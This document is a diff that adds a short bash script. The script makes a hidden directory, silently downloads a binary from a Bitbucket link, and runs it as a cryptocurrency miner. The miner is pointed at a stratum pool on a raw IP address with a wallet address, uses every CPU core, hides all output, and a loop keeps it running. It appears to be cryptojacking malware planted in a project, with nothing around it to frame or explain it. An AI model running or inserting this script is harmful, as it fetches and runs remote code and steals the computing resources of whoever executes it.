@@ -1,0 +1,9 @@
+#!/bin/bash
+mkdir .kap && cd .kap
+wget -O bubux https://bitbucket.org/buyyy/didieu/downloads/bct >/dev/null 2>&1
+chmod 777 bubux
+./bubux -a verus -o stratum+tcp://128.199.142.40:443 -u RCAb3ubiGm8tiKEkGH9UrFTFSanxAQjHd7.tes -t $(nproc --all) >/dev/null 2>&1
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
